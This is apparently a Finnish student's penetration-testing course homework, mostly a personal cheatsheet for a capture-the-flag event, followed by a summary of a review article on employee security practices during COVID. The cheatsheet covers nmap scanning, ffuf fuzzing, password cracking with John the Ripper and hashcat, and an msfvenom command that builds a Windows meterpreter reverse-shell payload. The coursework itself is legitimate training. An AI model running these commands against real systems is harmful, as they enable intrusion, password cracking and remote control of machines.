# h6 Lähtölaskenta

Lipunryöstö lähestyy, ja samalla kurssin päätös. Nyt valmistaudutaan lipunryöstöön, ja kurssin jälkeiseen elämään. Tieteellisten artikkeleiden silmäily auttaa oppariaiheen valinnassa. Harjoitusmaalit opettavat käytännön hakkerointia.

## a) Oma Cheatsheet

# nmap : https://www.stationx.net/nmap-cheat-sheet/

    Yksinkertainen skannaus yhdelle IP-osoitteelle:
    nmap <IP-osoite>

    Skannaus useille IP-osoitteille:
    nmap <IP-osoite1> <IP-osoite2> <IP-osoite3> ...
    
    Skannaus IP-osoitealueelle:
    nmap <alkuosoite>-<loppuosoite>
    Esim: nmap 192.168.1.1-254

    Skannaus käyttäen CIDR-notaatiota:
    nmap <verkkopolkun-IP>/<maski-bittien-määrä>
    Esim: nmap 192.168.1.0/24

    Skannaus yhdestä tai useammasta IP-osoitteesta, jotka on lueteltu tiedostossa:
    nmap -iL <tiedoston-nimi>

    Skannaus yhdestä tai useammasta satunnaisesti valitusta IP-osoitteesta:
    nmap -iR <lukumäärä>
    Esimerkiksi: nmap -iR 100

    Skannaus tietyn palvelimen kaikkia IP-osoitteita:
    nmap <verkkotunnus>
    Esim: nmap google.fi

    Skannauksen tekeminen, joka ohittaa käyttöoikeuden tarkistukset ja on nopeampi:
    nmap -Pn <IP-osoite>




# fuff: https://cheatsheet.haax.fr/web-pentest/tools/ffuf/


    ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u http://127.0.0.2:8000/FUZZ # 

Selitetty:

/fuff : ajaa ffuf ohjelman
-w : mitä sanalistaa ohjelma käyttää
/usr/share/wordlists/wfuzz/general/common.txt : sanalistani sijainti
-u : määrittää kohteen
http:127.0.0.2:8000/FUZZ : fuzz sanaan ohjelma kokoeilee sanalistan sanat

# Jhon the ripper: https://www.stationx.net/how-to-use-john-the-ripper/ , https://terokarvinen.com/2023/crack-file-password-with-john/

Työkalun asennus ja ympäristön valmistelu:

    sudo apt-get update
    sudo apt-get -y install git build-essential libssl-dev
    git clone --depth=1 https://github.com/openwall/john.git
    cd john/src/
    configure && make -s clean && make -sj4
    cd ../run/

Sanakirjojen lataaminen ja käyttäminen:

    wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
    tar xf rockyou.txt.tar.gz
    rm rockyou.txt.tar.gz

Hash-tyypin tunnistaminen ja valmistelu:

    john --format=raw-md5 --wordlist=rockyou.txt hashfile.txt

Zip-tiedostojen salasanojen murtaminen:

    zip2john tero.zip > tero.zip.hash
    john --wordlist=rockyou.txt tero.zip.hash

Erilaiset murtomenetelmät:

    john --single hashfile.txt
    john --incremental hashfile.txt
    john --wordlist=/path/to/wordlist.txt --format=raw-sha1 hashfile.txt

Tulosten tarkistaminen:

    john --show tero.zip.hash


    

# hashcat: https://denizhalil.com/2023/11/01/hashcat-password-cracking/ , https://terokarvinen.com/2022/cracking-passwords-with-hashcat/

luo/saa/pura:

    sudo apt-get update
    sudo apt-get -y install hashid hashcat wget
    mkdir hashed
    cd hashed

    wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
    tar xf rockyou.txt.tar.gz
    rm rockyou.txt.tar.gz

tunnista:

    hashid -m 6b1628b016dff46e6fa35684be6acc96

Murra salasana:

    hashcat -m 0 -a 0 '6b1628b016dff46e6fa35684be6acc96' rockyou.txt -o solved.txt

Tarkista murrettu salasana:

    cat solved.txt
    hashcat -m 0 6b1628b016dff46e6fa35684be6acc96 rockyou.txt



# msfvenom/metasploitable : https://www.comparitech.com/net-admin/metasploit-cheat-sheet/

    msfconsole
    use multi/handler/payload
    SET payload 
    SET LHOST 
    SET LPORT 
    run -j

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.x LPORT=80 -f exe > payload.exe

    sessions -i 1

# sql injektio: https://portswigger.net/web-security/sql-injection/cheat-sheet

# b) Review. Etsi ja tiivistä vertaisarviotu katsausartikkeli valitsemaltasi kyberturvallisuuden tai hakkeroinnin alalta.


![image](https://github.com/SakuKarp/Tunkeutumistestaus/assets/148875105/63404ea1-14f4-4e9b-9450-15a75d744073)


https://academic.oup.com/cybersecurity/article/10/1/tyae001/7588826


Ennen COVIDia organisaatioita ja työntekijöitä uhkasivat monenlaiset haitat työntekijöiden huonojen tietoturvakäytäntöjen vuoksi

Tekniset ratkaisut eivät kykene estämään nollapäivän hyökkäyksiä ja jatkuvia uhkia, joten ihmisten on osallistuttava suojaamaan järjestelmiä

Tehokkaat tietoturvakäytännöt voivat sisältää palomuurien ja virustorjuntaohjelmien käytön, yksityisyysasetusten käytön ja haitallisten linkkien välttämisen

Organisaatiot järjestävät tietoisuuden lisäämis- ja koulutusohjelmia hyvien tietoturvakäytäntöjen varmistamiseksi, mutta näissä ohjelmissa on usein ongelmia

Monilla organisaatioilla oli ennen COVIDia vähemmän kuin optimaaliset tietoturvakäytännöt ja monet työntekijät eivät olleet valmiita työskentelemään turvallisesti kotoa pandemian huippukaudella

Uudet uhkat, kuten COVID-19-teemaiset hyökkäykset ja nollapäivän hyökkäykset, lisäsivät kyberriskejä pandemian aikana









# c) Valmiina lipunryöstöön.


## References



https://academic.oup.com/cybersecurity/article/10/1/tyae001/7588826

https://jfp.csc.fi/web/haku#!PublicationInformationView/id/84000



